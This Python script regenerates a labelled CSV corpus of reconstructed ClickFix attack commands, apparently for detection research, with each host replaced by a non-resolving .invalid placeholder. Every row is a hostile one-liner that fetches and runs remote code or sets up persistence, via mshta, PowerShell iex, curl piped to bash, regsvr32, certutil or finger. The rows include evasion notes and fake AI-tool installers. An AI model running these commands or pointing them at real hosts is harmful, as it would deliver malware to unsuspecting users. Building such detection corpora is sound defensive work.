#!/usr/bin/env python3
"""Regenerate corpus/malicious.csv.

Every row is a TEXT-ONLY reconstruction of a command *structure* described in public
ClickFix reporting. Every payload host is replaced with a `.invalid` placeholder
(RFC 2606: guaranteed never to resolve). Nothing here is ever executed.

fidelity:
  reconstructed  - shape rebuilt from vendor prose/screenshots; tokens are leads to
                   confirm against sandbox data (ANY.RUN, urlscan), not literal strings.

No row is marked verbatim: confirm against the cited source before promoting one.
"""
import csv
import os

C2 = "c2.invalid"


ROWS = [
    # id, campaign, actor, platform, target, origin, text, fidelity, source, notes
    ("M01", "Fake reCAPTCHA (LummaC2)", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"mshta https://{C2}/verify.mp4 # ✅ ''I am not a robot - reCAPTCHA Verification ID: 2165''",
     "reconstructed", "CloudSEK Lumma fake CAPTCHA; AhnLab ASEC LummaC2 fake CAPTCHA",
     "mshta + media extension + decoy prose padding the visible Run-dialog tail"),
    ("M02", "Fake reCAPTCHA (LummaC2) PowerShell variant", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"powershell -w hidden -c \"$u='https://{C2}/a.txt';iex (iwr $u -UseBasicParsing).Content\" # I am not a robot: Ray ID 8f2a",
     "reconstructed", "CloudSEK; Unit 42 Fix the Click", "hidden window + iex(iwr) + decoy"),
    ("M04", "Fake browser update error", "crimeware", "windows", "terminal:powershell", "browser_unknown",
     f"irm https://{C2}/fix.ps1 | iex",
     "reconstructed", "Proofpoint ClickFix floods threat landscape", "pasted into a PowerShell window opened by the user"),
    ("M05", "TA427 diplomat lure", "Kimsuky/TA427", "windows", "terminal:powershell", "application:outlook",
     f"powershell -windowstyle hidden -command \"(New-Object Net.WebClient).DownloadFile('https://{C2}/d.dat',\"$env:TEMP\\d.vbs\"); wscript \"$env:TEMP\\d.vbs\"\"",
     "reconstructed", "Proofpoint Around the World in 90 Days", "download to temp then script host"),
    ("M06", "TA450 RMM install", "MuddyWater/TA450", "windows", "terminal:powershell", "application:outlook",
     f"powershell -c \"iwr https://{C2}/setup.msi -OutFile $env:TEMP\\s.msi; msiexec /i $env:TEMP\\s.msi /qn\"",
     "reconstructed", "Proofpoint Around the World in 90 Days", "RMM tool via msiexec"),
    ("M07", "TA422 fake verification", "APT28/TA422", "windows", "run_dialog", "browser_unknown",
     f"mshta https://{C2}/captcha.hta",
     "reconstructed", "Proofpoint Around the World in 90 Days", "mshta remote HTA"),
    ("M08", "UNK_RemoteRogue Red Hat lure", "UNK_RemoteRogue", "windows", "terminal:powershell", "browser_unknown",
     f"powershell -ep bypass -w 1 -c \"iex ([Text.Encoding]::UTF8.GetString((iwr https://{C2}/rr).Content))\"",
     "reconstructed", "Proofpoint Around the World in 90 Days", "Empire stager shape"),
    ("M09", "ClickFake Interview macOS", "Lazarus", "macos", "terminal:zsh", "browser_unknown",
     f"curl -k -o /var/tmp/ffmpeg.sh https://{C2}/ffmpeg.sh && chmod +x /var/tmp/ffmpeg.sh && nohup bash /var/tmp/ffmpeg.sh >/dev/null 2>&1 &",
     "reconstructed", "Sekoia From Contagious to ClickFake Interview", "fake camera driver fix"),
    ("M10", "ClickFake Interview Windows", "Lazarus", "windows", "terminal:cmd", "browser_unknown",
     f"curl -k -o \"%TEMP%\\nvidiaRelease.zip\" https://{C2}/nvidia.zip && powershell -Command \"Expand-Archive -Force -Path '%TEMP%\\nvidiaRelease.zip' -DestinationPath '%TEMP%\\nvidiaRelease'\" && wscript \"%TEMP%\\nvidiaRelease\\run.vbs\"",
     "reconstructed", "Sekoia From Contagious to ClickFake Interview", "curl -> Expand-Archive -> wscript; pasted into cmd typed into Win+R so RunMRU shows only cmd.exe"),
    ("M11", "Havoc via Win+X", "crimeware", "windows", "quick_access_menu", "application:outlook",
     f"powershell -c \"$s='https://{C2}/sites/doc/x.ps1'; iex ([Text.Encoding]::UTF8.GetString((iwr $s -UseBasicParsing).Content))\"",
     "reconstructed", "Fortinet Havoc SharePoint Graph API", "Win+X terminal avoids RunMRU"),
    ("M12", "Vidar via compromised WordPress", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"powershell -w h -c \"iex(irm 'https://{C2}/wp-content/v.png')\"",
     "reconstructed", "ASD ACSC ClickFix distributing Vidar", "script served as .png"),
    ("M13", "Binary rebuild via set /p", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"cmd /c \"curl -s -o %TEMP%\\b.txt https://{C2}/b.txt & echo|set /p=\"MZ\" > %TEMP%\\a.exe & findstr /V \"MZ\" %TEMP%\\b.txt >> %TEMP%\\a.exe & start %TEMP%\\a.exe\"",
     "reconstructed", "AhnLab ASEC paste (CTRL+V) phishing", "PE header written separately to dodge MZ scanning"),
    ("M14", "Squiblydoo", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"regsvr32 /s /n /u /i:https://{C2}/f.sct scrobj.dll",
     "reconstructed", "Unit 42 Fix the Click", "remote scriptlet"),
    ("M15", "rundll32 from temp", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"cmd /c curl -s -o %TEMP%\\u.dll https://{C2}/u.dll && rundll32 %TEMP%\\u.dll,Start",
     "reconstructed", "Unit 42 Fix the Click", "DLL in user-writable path"),
    ("M16", "certutil downloader", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"cmd /c certutil -urlcache -split -f https://{C2}/a.exe %TEMP%\\a.exe && %TEMP%\\a.exe",
     "reconstructed", "Unit 42 Fix the Click", "LOLBin download"),
    ("M17", "Fake Claude Code installer (AMOS)", "crimeware", "macos", "terminal:zsh", "browser_unknown",
     f"/bin/bash -c \"$(curl -fsSL https://{C2}/claude-code/install.sh)\"",
     "reconstructed", "ANY.RUN fake AI tool campaigns 2026", "byte-for-byte the Homebrew shape; only origin separates it"),
    ("M19", "Fake Codex CLI installer", "crimeware", "linux", "terminal:bash", "browser_unknown",
     f"curl -fsSL https://{C2}/codex/install | bash",
     "reconstructed", "ANY.RUN fake AI tool campaigns 2026", "pipe-to-shell from malvertised search result"),
    ("M20", "Fake ChatGPT desktop installer", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"powershell -ep bypass -w hidden -c \"iex (irm https://{C2}/chatgpt-setup)\"",
     "reconstructed", "ANY.RUN fake AI tool campaigns 2026", "SEO-poisoned download page"),
    ("M21", "Linux ClickFix wget", "crimeware", "linux", "terminal:bash", "browser_unknown",
     f"bash -c \"$(wget -qO- https://{C2}/s.sh)\"",
     "reconstructed", "MITRE DET0340 AN0963", "AN0963 shape"),
    ("M22", "Python stdin stager", "crimeware", "linux", "terminal:bash", "browser_unknown",
     f"curl -s https://{C2}/p.py | python3 -",
     "reconstructed", "MITRE DET0340 AN0963", "interpreter reads stdin"),
    ("M23", "Run key persistence", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"powershell -w hidden -c \"iwr https://{C2}/u.ps1 -OutFile $env:APPDATA\\u.ps1; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d 'powershell -w hidden -f %APPDATA%\\u.ps1' /f\"",
     "reconstructed", "Unit 42 Fix the Click", "Run key write"),
    ("M24", "LaunchAgent persistence", "crimeware", "macos", "terminal:zsh", "browser_unknown",
     f"curl -s -o ~/Library/LaunchAgents/com.apple.upd.plist https://{C2}/p.plist && launchctl load ~/Library/LaunchAgents/com.apple.upd.plist",
     "reconstructed", "MITRE DET0340 AN0964", "LaunchAgent"),
    ("M32", "Fake Teams/Zoom fix", "crimeware", "windows", "terminal:powershell", "browser_unknown",
     f"$c = 'https://{C2}/f.txt'; Invoke-Expression (Invoke-RestMethod -Uri $c)",
     "reconstructed", "Proofpoint ClickFix floods threat landscape", "variable indirection before IEX"),
    ("M33", "conhost --headless Run dialog", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"conhost --headless powershell -w h -c \"irm https://{C2}/a | iex\"",
     "reconstructed", "public 2025 ClickFix reporting", "hidden console host"),
    ("M34", "finger.exe downloader (KongTuke)", "crimeware", "windows", "run_dialog", "browser_unknown",
     f"cmd /c start \"\" /min cmd /c \"finger gcaptcha@{C2} | cmd\"",
     "reconstructed", "public 2025 ClickFix reporting", "finger as a LOLBin downloader"),
]

HEADER = ["id", "campaign", "actor", "platform", "target", "origin", "text", "fidelity", "source", "notes"]


def main():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    out = os.path.join(root, "corpus", "malicious.csv")
    with open(out, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(HEADER)
        w.writerows(ROWS)
    print(f"wrote {len(ROWS)} rows to {out}")


if __name__ == "__main__":
    main()
